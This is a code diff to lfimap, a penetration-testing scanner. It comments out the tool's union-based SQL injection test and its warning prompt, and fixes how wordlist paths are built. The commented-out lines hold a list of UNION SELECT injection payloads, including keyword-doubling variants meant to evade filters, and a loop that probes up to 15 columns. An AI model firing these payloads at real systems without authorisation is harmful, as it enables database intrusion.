@@ -659,51 +659,52 @@ def test_heuristics(url):
     return
 
 def test_sqli(url):
-    global skipsqli
-    if(skipsqli): return
-    if(args.verbose):
-        print("[i] Testing with union-based SQL injection up to 15 columns...")
+   # global skipsqli
+   # if(skipsqli): return
+   # if(args.verbose):
+   #     print("[i] Testing with union-based SQL injection up to 15 columns...")
     
-    pyldList = []
-    pyldList.append("1337 UNION ALL SELECT INJECT")
-    pyldList.append("1337\" UNION ALL SELECT INJECT-- -")
-    pyldList.append("1337' UNION ALL SELECT INJECT-- -")
-    pyldList.append("1337' UNION ALL SELECT INJECT%23")
-    pyldList.append("1337)' UNION ALL SELECT INJECT-- -")
-    pyldList.append("1337)\" UNION ALL SELECT INJECT-- -")
-    pyldList.append("1337 UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
-    pyldList.append("1337' UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
-    pyldList.append("1337)\" UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
-    pyldList.append("1337)' UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
-    pyldList.append("1337 UNIUNIONON ALL SELECT INJECT%23-- -%23")
-    pyldList.append("1337' UNIUNIONON ALL SELECT INJECT%23-- -%23")
-    pyldList.append("1337\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
-    pyldList.append("1337)\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
-    pyldList.append("1337 UNION ALL SELSELECTECT INJECT%23-- -%23")
-    pyldList.append("1337' UNION ALL SELSELECTECT INJECT%23-- -%23")
-    pyldList.append("1337\" UNION ALL SELSELECTECT INJECT%23-- -%23")
-    pyldList.append("1337)\" UNION ALL SELSELECTECT INJECT%23-- -%23")
+   # TODO make this better
+   # pyldList = []
+   # pyldList.append("1337 UNION ALL SELECT INJECT")
+   # pyldList.append("1337\" UNION ALL SELECT INJECT-- -")
+   # pyldList.append("1337' UNION ALL SELECT INJECT-- -")
+   # pyldList.append("1337' UNION ALL SELECT INJECT%23")
+   # pyldList.append("1337)' UNION ALL SELECT INJECT-- -")
+   # pyldList.append("1337)\" UNION ALL SELECT INJECT-- -")
+   # pyldList.append("1337 UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
+   # pyldList.append("1337' UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
+   # pyldList.append("1337)\" UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
+   # pyldList.append("1337)' UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
+   # pyldList.append("1337 UNIUNIONON ALL SELECT INJECT%23-- -%23")
+   # pyldList.append("1337' UNIUNIONON ALL SELECT INJECT%23-- -%23")
+   # pyldList.append("1337\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
+   # pyldList.append("1337)\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
+   # pyldList.append("1337 UNION ALL SELSELECTECT INJECT%23-- -%23")
+   # pyldList.append("1337' UNION ALL SELSELECTECT INJECT%23-- -%23")
+   # pyldList.append("1337\" UNION ALL SELSELECTECT INJECT%23-- -%23")
+   # pyldList.append("1337)\" UNION ALL SELSELECTECT INJECT%23-- -%23")
     
-    toInject = 'concat(0x6c66696d61702d696e6a65637465642d737472696e67)'
-    for p in pyldList:
-        # Test up to 15 columns, this will generate a lot of requests. Careful not to flood the target with --sqli/-a options!!!
-        for i in range(15):
-            if(i == 0): 
-                pyld = p.replace("INJECT", toInject)
-                ltrInject = ',' + toInject
-            else: pyld = p.replace("INJECT", toInject + (ltrInject*i))
-            
-            if(args.postreq): req, br = POST(url, headers, args.postreq.replace(args.param,pyld), proxies, "SQLI", "SQLI")
-            else: req, br = GET(url.replace(args.param,pyld), headers, proxies, "SQLI", "SQLI")
-            
-            if("lfimap-injected-string" in req.text.lower()):
-                if(args.postreq): print("[+] SQLI with " + str(i+1) + " columns -> " + url + " HTTP POST -> " + args.postreq.replace(args.param,pyld))
-                else: print("[+] SQLI with " + str(i+1)+ " columns -> " + url.replace(args.param,pyld))
-                stats["vulns"] += 1
-                # If '--no-stop' is set, then union based sqli is stopped, because none of the following payloads will be valid
-                # because number of columns won't match. Break out of the loop, and test for blind sql injection.
-                if(not args.no_stop): return
-                else: break
+   # toInject = 'concat(0x6c66696d61702d696e6a65637465642d737472696e67)'
+   # for p in pyldList:
+   #     # Test up to 15 columns, this will generate a lot of requests. Careful not to flood the target with --sqli/-a options!!!
+   #     for i in range(15):
+   #         if(i == 0): 
+   #             pyld = p.replace("INJECT", toInject)
+   #             ltrInject = ',' + toInject
+   #         else: pyld = p.replace("INJECT", toInject + (ltrInject*i))
+   #         
+   #         if(args.postreq): req, br = POST(url, headers, args.postreq.replace(args.param,pyld), proxies, "SQLI", "SQLI")
+   #         else: req, br = GET(url.replace(args.param,pyld), headers, proxies, "SQLI", "SQLI")
+   #         
+   #         if("lfimap-injected-string" in req.text.lower()):
+   #             if(args.postreq): print("[+] SQLI with " + str(i+1) + " columns -> " + url + " HTTP POST -> " + args.postreq.replace(args.param,pyld))
+   #             else: print("[+] SQLI with " + str(i+1)+ " columns -> " + url.replace(args.param,pyld))
+   #             stats["vulns"] += 1
+   #             # If '--no-stop' is set, then union based sqli is stopped, because none of the following payloads will be valid
+   #             # because number of columns won't match. Break out of the loop, and test for blind sql injection.
+   #             if(not args.no_stop): return
+   #             else: break
 
     #-----------------------------------------------------
     if(args.verbose):
@@ -1702,13 +1703,17 @@ if(__name__ == "__main__"):
             print("[-] URL not valid, exiting...")
             sys.exit(-1)
 
+    if(scriptDirectory == ""):
+        separator = ""
+    else: separator = os.sep
+    
     #Check if provided trunc wordlist exists
     if(truncWordlist is not None):
         if(not os.path.isfile(truncWordlist)):
             print("[-] Specified truncation wordlist '" + truncWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        truncWordlist = scriptDirectory + os.sep + "wordlists/short.txt"
+        truncWordlist = scriptDirectory + separator + "wordlists" + os.sep + "short.txt"
         if((not os.path.exists(truncWordlist)) and (args.test_all or args.trunc)):
             print("[-] Cannot locate " + truncWordlist + " wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
             sys.exit(-1)
@@ -1719,7 +1724,7 @@ if(__name__ == "__main__"):
             print("[-] Specified command injection wordlist '" + cmdWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        cmdWordlist = scriptDirectory + os.sep + "wordlists/cmdInjection.txt"
+        cmdWordlist = scriptDirectory + separator + "wordlists" + os.sep + "cmdInjection.txt"
         if((not os.path.exists(cmdWordlist)) and (args.test_all or args.cmd)):
             print("[-] Cannot locate " + cmdWordlist + " wordlist. Since '-a' or '--cmdinject' is specified, lfimap will exit...")
             sys.exit(-1)
@@ -1744,14 +1749,14 @@ if(__name__ == "__main__"):
                 print("[-] LPORT must be between 1 and 65534. Exiting ...")
                 sys.exit(-1)
 
-    if(args.test_all or args.sqli):
-        #Warn user for sqli testing
-        print("[!] WARNING. SQL injection test could easily generate hundreds of request per endpoint!")
-        option = input("[?] Are you sure you want to continue? y/n: ")
-        print()
-        if(not (option == "y" or option == "Y")): 
-            print("[i] Lfimap will skip sqli testing...")
-            skipsqli = True
+    #if(args.test_all or args.sqli):
+    #    #Warn user for sqli testing
+    #    print("[!] WARNING. SQL injection test could easily generate hundreds of request per endpoint!")
+    #    option = input("[?] Are you sure you want to continue? y/n: ")
+    #    print()
+    #    if(not (option == "y" or option == "Y")): 
+    #        print("[i] Lfimap will skip sqli testing...")
+    #        skipsqli = True
 
     #Check if proxy is correct
     if(args.proxyAddr):
